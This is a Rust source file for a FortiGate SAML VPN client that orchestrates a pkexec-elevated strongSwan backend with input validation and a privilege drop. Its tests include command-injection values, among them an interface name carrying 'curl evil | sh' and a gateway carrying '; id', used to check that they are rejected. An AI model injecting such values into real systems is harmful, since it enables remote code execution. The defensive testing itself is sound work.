//! Connection orchestration (all native Rust, no external interpreter).
//!
//! GUI side (unprivileged):  SAML login in-process (browser via xdg-open, local callback listener).
//! Privileged side:          `pkexec <this binary> --backend` - a private strongSwan charon does IKEv2 and the XFRM
//!                           SAs; we add the xfrm interface, routes and DNS, then drop to the user + CAP_NET_ADMIN.
//!   * the request (settings + PSK + one-time token) is sent as one JSON line on stdin, never on argv;
//!   * afterwards stdin is a control channel: "disconnect" or EOF (GUI closed/crashed) => teardown;
//!   * progress is reported as `@@{json}` lines on stdout, other lines are log output.

use crate::charon::{self, ClientAuth, ConnParams};
use crate::config::{Config, Profile, RouteMode, UserAuth};
use crate::net::{self, DhGroup, Encryption, Hash, Host, IfName, Ipv4Net, Mtu, Secret};
use crate::tunnel::{Tunnel, TunnelOpts};
use crate::{netlink, privdrop};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::io::{BufRead, BufReader, Write};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::Sender;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

// ═════════════════════════════ GUI side ═════════════════════════════
pub enum Event {
    Log(String),
    /// status event (`event` field + data), from SAML or from the privileged backend
    Status(Value),
    Elevating,
    Error(String),
    Finished,
}

#[derive(Default)]
struct Shared {
    backend_stdin: Option<ChildStdin>,
}

pub struct Session {
    shared: Arc<Mutex<Shared>>,
    cancel: Arc<AtomicBool>,
    thread: Option<std::thread::JoinHandle<()>>,
}

/// What the GUI asks the privileged backend to do. Every field is a checked type, so a malformed request is rejected
/// while it's parsed, before anything runs as root.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct BackendRequest {
    pub gateway: Host,
    pub ike_port: std::num::NonZeroU16,
    pub psk: Secret,
    /// EAP identity (UID for SSO, username otherwise); None = PSK-only authentication
    pub eap_identity: Option<String>,
    /// EAP secret: SAML tokenid or password
    pub token: Secret,
    pub local_id: Option<String>,
    pub dh_groups: Vec<DhGroup>,
    pub ike_proposals: Vec<(Encryption, Hash)>,
    pub esp_proposals: Vec<(Encryption, Hash)>,
    pub natt_keepalive: u32,
    pub ifname: IfName,
    pub mtu: Mtu,
    pub routes: Option<Vec<Ipv4Net>>,
    pub block_ipv6: bool,
    pub set_dns: bool,
    pub verbose: bool,
    /// `--probe`: connect, report, disconnect; nothing is set up on this machine
    #[serde(default)]
    pub probe: bool,
}

impl Session {
    pub fn start(cfg: &Config, profile: &Profile, tx: Sender<Event>, ctx: eframe::egui::Context) -> Session {
        let shared = Arc::new(Mutex::new(Shared::default()));
        let cancel = Arc::new(AtomicBool::new(false));
        let (cfg, profile) = (cfg.clone(), profile.clone());
        let (sh, cn) = (shared.clone(), cancel.clone());
        let thread = std::thread::spawn(move || {
            let tx2 = tx.clone();
            let ctx2 = ctx.clone();
            let send: Arc<dyn Fn(Event) + Send + Sync> = Arc::new(move |e: Event| {
                let _ = tx2.send(e);
                ctx2.request_repaint();
            });
            if let Err(e) = run(&cfg, &profile, &sh, &cn, send.clone()) {
                send(Event::Error(e));
            }
            send(Event::Finished);
        });
        Session { shared, cancel, thread: Some(thread) }
    }

    pub fn disconnect(&self) {
        self.cancel.store(true, Ordering::SeqCst);
        if let Some(stdin) = self.shared.lock().unwrap().backend_stdin.as_mut() {
            let _ = stdin.write_all(b"disconnect\n");
            let _ = stdin.flush();
        }
    }

    pub fn is_finished(&self) -> bool {
        self.thread.as_ref().is_none_or(|t| t.is_finished())
    }

    pub fn shutdown(mut self, timeout: Duration) {
        self.disconnect();
        let t0 = Instant::now();
        while !self.is_finished() && t0.elapsed() < timeout {
            std::thread::sleep(Duration::from_millis(50));
        }
        self.shared.lock().unwrap().backend_stdin.take(); // EOF => backend tears down regardless
        if let Some(t) = self.thread.take() {
            if t.is_finished() {
                let _ = t.join();
            }
        }
    }
}

/// (EAP identity, EAP secret) for a profile: SSO -> (UID, tokenid), EAP login -> (username, password).
fn credentials(cfg: &Config, p: &Profile, sso_token: Option<String>) -> (Option<String>, String) {
    match (p.sso.enabled, p.auth.mode) {
        (true, _) => (Some(cfg.uid.clone()), sso_token.unwrap_or_default()),
        (false, UserAuth::Eap) => (Some(p.auth.username.trim().to_string()), p.auth.password.clone()),
        (false, UserAuth::None) => (None, String::new()),
    }
}

/// The backend request for profile `p`, with every setting checked. Errors name the setting to fix.
fn build_request(cfg: &Config, p: &Profile, sso_token: Option<String>) -> Result<BackendRequest, String> {
    let (eap_identity, token) = credentials(cfg, p, sso_token);
    let props = |v: &[crate::config::Proposal], phase: &str| -> Result<Vec<(Encryption, Hash)>, String> {
        let v = v.iter().map(|x| Ok((Encryption::parse(&x.enc)?, Hash::parse(&x.hash)?))).collect::<Result<Vec<_>, String>>()?;
        if v.is_empty() { Err(format!("{phase}: select at least one proposal")) } else { Ok(v) }
    };
    let routes = match p.network.route_mode {
        RouteMode::Gateway => None,
        RouteMode::Full => Some(vec!["0.0.0.0/0".parse()?]),
        RouteMode::Custom => Some(
            p.network.custom_routes
                .split(|c: char| c == ',' || c.is_whitespace())
                .filter(|r| !r.is_empty())
                .map(|r| r.parse::<Ipv4Net>().map_err(|e| format!("custom routes: {e}")))
                .collect::<Result<Vec<_>, String>>()?,
        ),
    };
    Ok(BackendRequest {
        gateway: p.gateway.parse().map_err(|e| format!("remote gateway: {e}"))?,
        ike_port: std::num::NonZeroU16::new(p.ike.port).ok_or("IKE port: must be 1 to 65535")?,
        psk: Secret(p.psk.clone()),
        eap_identity,
        token: Secret(token),
        local_id: Some(p.ike.local_id.trim().to_string()).filter(|s| !s.is_empty()),
        dh_groups: p.ike.dh_groups.iter().map(|g| DhGroup::try_from(*g)).collect::<Result<_, _>>()?,
        ike_proposals: props(&p.ike.proposals, "Phase 1")?,
        esp_proposals: props(&p.esp.proposals, "Phase 2")?,
        natt_keepalive: p.ike.natt_keepalive,
        ifname: p.network.ifname.parse().map_err(|e| format!("interface name: {e}"))?,
        mtu: Mtu::try_from(p.network.mtu)?,
        routes,
        block_ipv6: p.network.block_ipv6,
        set_dns: p.network.set_dns,
        verbose: cfg.verbose,
        probe: false,
    })
}

fn run(cfg: &Config, p: &Profile, shared: &Arc<Mutex<Shared>>, cancel: &Arc<AtomicBool>, send: Arc<dyn Fn(Event) + Send + Sync>) -> Result<(), String> {
    if p.gateway.trim().is_empty() {
        return Err("no remote gateway configured".into());
    }
    if charon::charon_binary().is_none() {
        return Err(charon::install_hint().into());
    }
    build_request(cfg, p, None)?; // every setting checked before the SSO login and the password prompt
    if p.psk.is_empty() {
        return Err("no pre-shared key configured".into());
    }
    if !p.sso.enabled && p.auth.mode == UserAuth::Eap && (p.auth.username.trim().is_empty() || p.auth.password.is_empty()) {
        return Err("enter a username and password (or enable SSO)".into());
    }

    // ---- 1. SAML, unprivileged, in-process (SSO profiles only) ----
    let sso_token = if p.sso.enabled { Some(sso_login(cfg, p, cancel, send.clone())?) } else { None };
    if cancel.load(Ordering::SeqCst) {
        return Ok(());
    }

    // ---- 2. IKE + tunnel as root: pkexec <self> --backend ----
    run_backend(cfg, p, sso_token, shared, cancel, send)
}

/// SAML login; Err("") on user cancel.
fn sso_login(cfg: &Config, p: &Profile, cancel: &Arc<AtomicBool>, send: Arc<dyn Fn(Event) + Send + Sync>) -> Result<String, String> {
    send(Event::Status(json!({"event": "saml_start"})));
    let s2 = send.clone();
    let log: Arc<dyn Fn(String) + Send + Sync> = Arc::new(move |m| s2(Event::Log(m)));
    let s3 = send.clone();
    let res = crate::saml::login(
        &crate::saml::SamlParams {
            gateway: p.gateway.trim(),
            port: p.sso.port,
            uid: &cfg.uid,
            verify_cert: p.sso.verify_cert,
            open_browser: p.sso.open_browser,
            timeout: Duration::from_secs(p.sso.timeout as u64),
        },
        cancel,
        log,
        &move |url| s3(Event::Status(json!({"event": "saml_url", "url": url}))),
    );
    let saml = match res {
        Err(e) if cancel.load(Ordering::SeqCst) => {
            send(Event::Log(format!("SAML: {e}")));
            return Ok(String::new());
        }
        r => r?,
    };
    send(Event::Status(json!({"event": "saml_ok", "username": saml.username})));
    Ok(saml.token)
}

fn run_backend(
    cfg: &Config,
    p: &Profile,
    sso_token: Option<String>,
    shared: &Arc<Mutex<Shared>>,
    cancel: &Arc<AtomicBool>,
    send: Arc<dyn Fn(Event) + Send + Sync>,
) -> Result<(), String> {
    let exe = std::env::current_exe().map_err(|e| format!("cannot locate own executable: {e}"))?;
    send(Event::Elevating);
    send(Event::Log("requesting root privileges (pkexec) to set up the tunnel".into()));
    let mut child = Command::new("pkexec")
        .arg(&exe)
        .arg("--backend")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("cannot start pkexec: {e}"))?;
    let mut stdin = child.stdin.take().unwrap();
    let req = serde_json::to_string(&build_request(cfg, p, sso_token)?).map_err(|e| e.to_string())? + "\n";
    stdin.write_all(req.as_bytes()).map_err(|e| format!("backend stdin: {e}"))?;
    stdin.flush().ok();
    shared.lock().unwrap().backend_stdin = Some(stdin);
    if cancel.load(Ordering::SeqCst) {
        if let Some(s) = shared.lock().unwrap().backend_stdin.as_mut() {
            let _ = s.write_all(b"disconnect\n");
        }
    }
    let stderr = child.stderr.take().unwrap();
    let s4 = send.clone();
    let eth = std::thread::spawn(move || {
        for l in BufReader::new(stderr).lines().map_while(Result::ok) {
            if !l.trim().is_empty() {
                s4(Event::Log(l));
            }
        }
    });
    for line in BufReader::new(child.stdout.take().unwrap()).lines().map_while(Result::ok) {
        match line.strip_prefix("@@").and_then(|j| serde_json::from_str::<Value>(j).ok()) {
            Some(v) => send(Event::Status(v)),
            None => send(Event::Log(line)),
        }
    }
    let _ = eth.join();
    shared.lock().unwrap().backend_stdin.take();
    let st = child.wait().map_err(|e| e.to_string())?;
    match st.code() {
        Some(0) => Ok(()),
        Some(126) => Err("root authorization was cancelled".into()),
        Some(127) => Err("not authorized to run the VPN backend as root (pkexec)".into()),
        Some(1) => Ok(()), // backend already reported the error via a status event
        c => Err(format!("backend exited with status {c:?} (see log)")),
    }
}

// ═════════════════════════════ privileged side ═════════════════════════════
static STOP: AtomicBool = AtomicBool::new(false);
static VERBOSE: AtomicBool = AtomicBool::new(false);

fn out(line: String) {
    let mut o = std::io::stdout().lock();
    let _ = writeln!(o, "{line}"); // never panic on a closed pipe
    let _ = o.flush();
}
fn status(v: Value) {
    out(format!("@@{v}"));
}
fn blog(m: String) {
    out(format!("[*] {m}"));
}
fn bdbg(m: String) {
    if VERBOSE.load(Ordering::Relaxed) {
        out(format!("[d] {m}"));
    }
}

extern "C" fn on_signal(_: libc::c_int) {
    STOP.store(true, Ordering::SeqCst);
}

/// Entry point for `fortisaml-gui --backend` (run via pkexec).
pub fn privileged_main() -> i32 {
    unsafe {
        libc::signal(libc::SIGTERM, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGINT, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGHUP, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
    if unsafe { libc::geteuid() } != 0 {
        status(json!({"event": "error", "message": "backend must run as root"}));
        return 1;
    }
    let mut first = String::new();
    if std::io::stdin().read_line(&mut first).unwrap_or(0) == 0 {
        return 1;
    }
    let req: BackendRequest = match serde_json::from_str(&first) {
        Ok(r) => r,
        Err(e) => {
            status(json!({"event": "error", "message": format!("bad backend request: {e}")}));
            return 1;
        }
    };
    VERBOSE.store(req.verbose, Ordering::Relaxed);
    std::thread::spawn(|| {
        for line in std::io::stdin().lock().lines() {
            match line {
                Ok(l) if ["disconnect", "quit", "stop"].contains(&l.trim()) => break,
                Ok(_) => continue,
                Err(_) => break,
            }
        }
        STOP.store(true, Ordering::SeqCst); // also on EOF: front-end went away
    });
    match run_privileged(&req) {
        Ok(()) => 0,
        Err(e) => {
            blog(format!("ERROR: {e}"));
            status(json!({"event": "error", "message": e}));
            status(json!({"event": "disconnected"}));
            1
        }
    }
}

fn run_privileged(r: &BackendRequest) -> Result<(), String> {
    let binary = charon::charon_binary().ok_or_else(|| charon::install_hint().to_string())?;
    // held until this process exits, also across the privilege drop
    let _lock = charon::lock()?;
    if charon::kill_stale() > 0 {
        blog("stopped a charon left behind by a previous run".into());
    }
    if !r.probe {
        let n = netlink::purge(&r.ifname)?;
        if n > 0 {
            blog(format!("purged {n} stale item(s) from a previous run"));
        }
    }
    let dns_name = (r.set_dns && !r.probe).then(|| charon::resolvconf_name(&r.ifname, charon::resolvconf_target().as_deref()));
    let conf = charon::write_config(&charon::config(r.natt_keepalive.max(5), r.verbose, dns_name.as_deref()))?;
    status(json!({"event": "ike_start", "gateway": r.gateway.to_string()}));
    // charon must be started from this (the main) thread: it gets SIGTERM when this thread ends
    let mut child = charon::spawn(binary, &conf)?;
    let stderr = child.stderr.take().expect("piped stderr");
    std::thread::spawn(move || {
        // always shown: startup and plugin errors are only explained here (verbose raises charon's log level)
        for l in BufReader::new(stderr).lines().map_while(Result::ok) {
            blog(format!("charon: {l}"));
        }
    });
    let result = session(r, &mut child);
    // SIGTERM so charon removes its SAs and policies; the kept CAP_KILL allows this after the privilege drop too
    charon::stop(&mut child, Duration::from_secs(5));
    result
}

/// One VPN session with charon running: connect, set up the tunnel, drop privileges, wait, tear down.
fn session(r: &BackendRequest, child: &mut std::process::Child) -> Result<(), String> {
    let mut v = charon::wait_for_socket(child, Duration::from_secs(5))?;
    charon::check_plugins(&mut v, r.set_dns && !r.probe)?;
    let auth = match &r.eap_identity {
        Some(identity) => ClientAuth::Eap { identity: identity.clone(), secret: r.token.clone() },
        None => ClientAuth::PskOnly,
    };
    let params = ConnParams {
        gateway: r.gateway.clone(),
        ike_port: r.ike_port.get(),
        ike_proposals: net::ike_proposals(&r.ike_proposals, &r.dh_groups),
        esp_proposals: net::esp_proposals(&r.esp_proposals),
        local_id: r.local_id.clone(),
        auth,
        psk: r.psk.clone(),
    };
    if r.probe {
        let est = charon::connect(&mut v, &params, &blog)?;
        charon::terminate(&mut v);
        blog(format!("PROBE OK: ip {} routes {:?}; SA deleted again", est.vip, est.remote_ts));
        status(json!({"event": "disconnected"}));
        return Ok(());
    }
    // the interface exists before IKE, so charon can hand the VPN's DNS servers to resolvconf for it
    let opts = TunnelOpts { ifname: r.ifname.clone(), mtu: r.mtu, routes: r.routes.clone(), block_ipv6: r.block_ipv6, set_dns: r.set_dns };
    let mut tun = Tunnel::create(&opts, &bdbg)?;
    let result = tunnel_session(&mut v, &mut tun, &params, &opts);
    tun.down(&bdbg);
    charon::terminate(&mut v);
    if result.is_ok() {
        blog("disconnected".into());
        status(json!({"event": "disconnected"}));
    }
    result
}

/// Connect, configure the interface, drop privileges and wait until the session ends. The caller tears down.
fn tunnel_session(v: &mut crate::vici::Vici, tun: &mut Tunnel, params: &ConnParams, opts: &TunnelOpts) -> Result<(), String> {
    let est = charon::connect(v, params, &blog)?;
    blog(format!("IKE SA + child SA established: ip {} routes {:?}", est.vip, est.remote_ts));
    status(json!({"event": "established", "config": {"ip": est.vip}}));
    if STOP.load(Ordering::SeqCst) {
        return Ok(());
    }
    tun.configure(&est, opts, &bdbg)?;
    let routes: Vec<String> = tun.routes.iter().map(|n| n.to_string()).collect();
    status(json!({"event": "tunnel_up", "ifname": opts.ifname.to_string(), "ip": est.vip, "routes": routes, "full_tunnel": tun.full}));
    blog(format!("tunnel up: {} ip={} routes={routes:?}", opts.ifname, est.vip));

    // charon reports the SA going down (gateway delete, DPD timeout) as ike-updown
    v.register("ike-updown")?;
    privdrop::drop_to(privdrop::pkexec_uid()?)?;
    blog("running as your user now, keeping only the network-admin and kill capabilities".into());
    status(json!({"event": "connected"}));

    let mut reason = "disconnect requested";
    while !STOP.load(Ordering::SeqCst) {
        match v.next_event(Duration::from_secs(1)) {
            Ok(Some((name, body))) if name == "ike-updown" && charon::is_down(&body) => {
                reason = "the gateway ended the connection";
                break;
            }
            Ok(_) => {}
            Err(e) => {
                blog(format!("charon stopped: {e}"));
                reason = "strongSwan stopped";
                break;
            }
        }
    }
    blog(format!("disconnecting: {reason}"));
    status(json!({"event": "disconnecting"}));
    Ok(())
}

/// `fortisaml-gui --down [ifname]`: remove leftovers of a crashed session (needs root).
pub fn down_main(ifname: &str) -> i32 {
    let ifname: IfName = match ifname.parse() {
        Ok(n) => n,
        Err(e) => {
            eprintln!("{e}");
            return 2;
        }
    };
    // refuses while a session runs: its interface and charon aren't leftovers
    let _lock = match charon::lock() {
        Ok(l) => l,
        Err(e) => {
            eprintln!("{e}");
            return 1;
        }
    };
    let stopped = charon::kill_stale();
    match netlink::purge(&ifname) {
        Ok(n) => {
            println!("removed {} stale item(s)", n + stopped);
            0
        }
        Err(e) => {
            eprintln!("{e}");
            1
        }
    }
}

/// `fortisaml-gui --probe [--gateway H] [--saml-port P] [--ike-port P] [--psk K] [--no-verify] [--no-browser]
///                        [--token T] [--no-sso --username U --password P | --no-eap] [-v]`
/// End-to-end test: SAML + IKEv2/EAP negotiation with the selected profile (overridable) through a private charon
/// (root via pkexec), prints the result and deletes the SA again. No interface, routes or DNS are set up.
pub fn probe_main(args: &[String]) -> i32 {
    let arg = |k: &str| args.iter().position(|a| a == k).and_then(|i| args.get(i + 1)).cloned();
    let flag = |k: &str| args.iter().any(|a| a == k);
    VERBOSE.store(flag("-v"), Ordering::Relaxed);
    let cfg = Config::load();
    cfg.load_errors.iter().for_each(|e| eprintln!("{e}"));
    let mut p = cfg.profiles[cfg.selected].clone();
    // read-only: probe never writes the config or the keyring
    match crate::keyring::SecretServiceStore::connect() {
        Ok(store) => crate::keyring::fill_profile(&store, &mut p).iter().for_each(|e| eprintln!("{e}")),
        Err(u) => eprintln!("{}", u.message()),
    }
    if let Some(g) = arg("--gateway") {
        p.gateway = g;
    }
    if let Some(x) = arg("--saml-port").and_then(|x| x.parse().ok()) {
        p.sso.port = x;
    }
    if let Some(x) = arg("--ike-port").and_then(|x| x.parse().ok()) {
        p.ike.port = x;
    }
    if let Some(k) = arg("--psk") {
        p.psk = k;
    }
    if flag("--no-sso") {
        p.sso.enabled = false;
    }
    if flag("--no-eap") {
        p.sso.enabled = false;
        p.auth.mode = UserAuth::None;
    } else if arg("--username").is_some() {
        p.auth.mode = UserAuth::Eap;
    }
    if let Some(u) = arg("--username") {
        p.auth.username = u;
    }
    if let Some(pw) = arg("--password") {
        p.auth.password = pw;
    }
    if flag("--no-verify") {
        p.sso.verify_cert = false;
    }
    if flag("--no-browser") {
        p.sso.open_browser = false;
    }
    let result = (|| -> Result<(), String> {
        let token = match arg("--token") {
            Some(t) => Some(t),
            None if !p.sso.enabled => None,
            None => Some({
                let log: Arc<dyn Fn(String) + Send + Sync> = Arc::new(blog);
                crate::saml::login(
                    &crate::saml::SamlParams {
                        gateway: p.gateway.trim(),
                        port: p.sso.port,
                        uid: &cfg.uid,
                        verify_cert: p.sso.verify_cert,
                        open_browser: p.sso.open_browser,
                        timeout: Duration::from_secs(p.sso.timeout as u64),
                    },
                    &AtomicBool::new(false),
                    log,
                    &|_| {},
                )?
                .token
            }),
        };
        let mut req = build_request(&cfg, &p, token)?;
        req.probe = true;
        req.verbose = flag("-v");
        let exe = std::env::current_exe().map_err(|e| format!("cannot locate own executable: {e}"))?;
        blog("requesting root privileges (pkexec) to run strongSwan".into());
        let mut child = Command::new("pkexec")
            .arg(&exe)
            .arg("--backend")
            .stdin(Stdio::piped())
            .spawn()
            .map_err(|e| format!("cannot start pkexec: {e}"))?;
        let mut stdin = child.stdin.take().expect("piped stdin");
        let line = serde_json::to_string(&req).map_err(|e| e.to_string())? + "\n";
        stdin.write_all(line.as_bytes()).map_err(|e| format!("backend stdin: {e}"))?;
        // stdin stays open while the backend works: EOF would mean "disconnect"
        let st = child.wait().map_err(|e| e.to_string())?;
        drop(stdin);
        if st.success() { Ok(()) } else { Err(format!("backend exited with {st}")) }
    })();
    match result {
        Ok(()) => 0,
        Err(e) => {
            blog(format!("PROBE FAILED: {e}"));
            1
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> (Config, Profile) {
        let cfg = Config::default();
        let mut p = cfg.profiles[0].clone();
        p.gateway = "vpn.example.com".into();
        p.psk = "k".into();
        (cfg, p)
    }

    #[test]
    fn request_from_a_normal_profile() {
        let (cfg, p) = profile();
        let r = build_request(&cfg, &p, Some("tok".into())).unwrap();
        assert_eq!(r.eap_identity.as_deref(), Some(cfg.uid.as_str()), "SSO: the FortiClient UID is the EAP identity");
        assert_eq!(r.token, Secret("tok".into()));
        assert_eq!(net::ike_proposals(&r.ike_proposals, &r.dh_groups), ["aes128-sha1-ecp384", "aes256-sha256-ecp384"]);
        assert_eq!(r.routes, None);
    }

    #[test]
    fn hostile_or_broken_profiles_are_refused_before_pkexec() {
        let (cfg, p) = profile();
        let bad = |f: &dyn Fn(&mut Profile)| {
            let mut q = p.clone();
            f(&mut q);
            build_request(&cfg, &q, None).unwrap_err()
        };
        assert!(bad(&|q| q.network.ifname = "x; curl evil | sh".into()).starts_with("interface name:"));
        assert!(bad(&|q| q.gateway = "vpn.example.com; id".into()).starts_with("remote gateway:"));
        let e = bad(&|q| {
            q.network.route_mode = RouteMode::Custom;
            q.network.custom_routes = "10.0.0.0/8, 10.1.2.3/16".into();
        });
        assert!(e.starts_with("custom routes:") && e.contains("did you mean 10.1.0.0/16"), "{e}");
        assert!(bad(&|q| q.ike.dh_groups = vec![5]).contains("DH group 5"));
        assert!(bad(&|q| q.ike.proposals[0].enc = "DES".into()).contains("unsupported encryption"));
        assert!(bad(&|q| q.network.mtu = 9000).contains("MTU"));
        assert!(bad(&|q| q.ike.port = 0).starts_with("IKE port"));
    }

    #[test]
    fn request_json_with_a_bad_value_is_rejected_by_the_backend() {
        let (cfg, p) = profile();
        let mut v = serde_json::to_value(build_request(&cfg, &p, None).unwrap()).unwrap();
        v["ifname"] = "-x".into();
        let e = serde_json::from_value::<BackendRequest>(v).unwrap_err().to_string();
        assert!(e.contains("invalid interface name"), "{e}");
    }
}
